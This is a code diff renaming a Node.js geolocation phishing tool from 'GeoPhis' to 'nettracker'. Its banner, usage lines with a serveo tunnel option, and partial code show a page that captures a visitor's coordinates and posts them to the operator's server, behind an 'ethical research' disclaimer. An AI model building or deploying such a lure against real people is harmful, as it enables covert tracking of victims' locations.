@@ -12,8 +12,8 @@ const bold = "\x1b[1m";
 const faint = "\x1b[2m";
 const underline = "\x1b[4m";
 
-const geophis = `
-                         ${green}&&&&&${reset}          GeoPhis - Geolocation Phising via Nodejs HTTP Server
+const nettracker = `
+                         ${green}&&&&&${reset}          nettracker - Geolocation Phising via Nodejs HTTP Server
                      ${green}&&&&     &${reset}
                   ${green}&&&    &&&&&${reset}          Usage: node nettrack.js [Options]
                ${green}&&    &&&&${reset}&&& &
@@ -27,7 +27,7 @@ const geophis = `
     ${green}&& &&${reset}  &&           ${red}&&&     &&&${reset}      node nettrack.js -p 8080 -t serveo -wl mone
     ${green}&  &${reset}  &&             ${red}&&&&&&&&&${reset}
    ${green}&${reset}  ${yellow}&&&&&${reset}               ${red}&&&&&&&${reset}       \x1b[41m${underline}Legal disclaimer${reset}
-  ${green}&&${reset} ${yellow}&$     &&${reset}             ${red}&&&&&${reset}        ${faint}GeoPhis is developed and distributed for ethical research${reset}
+  ${green}&&${reset} ${yellow}&$     &&${reset}             ${red}&&&&&${reset}        ${faint}nettracker is developed and distributed for ethical research${reset}
  ${green}&&  ${yellow}&  &&  &&${reset}              ${red}&&&${reset}         ${faint}purposes only, and demonstration. The developers of this${reset}
  ${green}&    ${yellow}&     && &${reset}             ${red}&${reset}          ${faint}tool are not responsible for any misuse.${reset}
  ${green}&    ${yellow}&&&& &&  &${reset}
@@ -57,7 +57,7 @@ let htmlContent = `
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
 
-        fetch("/geophis", {
+        fetch("/nettracker", {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
@@ -97,7 +97,7 @@ function HTTPServer(port, windowLink) {
                 res.writeHead(200, { "Content-Type": "text/html" });
                 let data = htmlContent.replace("WINDOW_LINK", windowLink);
                 res.end(data);
-            } else if (req.method === "POST" && req.url === "/geophis") {
+            } else if (req.method === "POST" && req.url === "/nettracker") {
                 let body = "";
 
                 req.on("data", chunk => {
@@ -272,7 +272,7 @@ async function runScript() {
             }
         }
     } else if (args[0] === "-h") {
-        console.log(geophis);
+        console.log(nettracker);
     } else {
         console.log(
             `[i] Try '${bold}node nettrack.js -h${reset} for more information'`
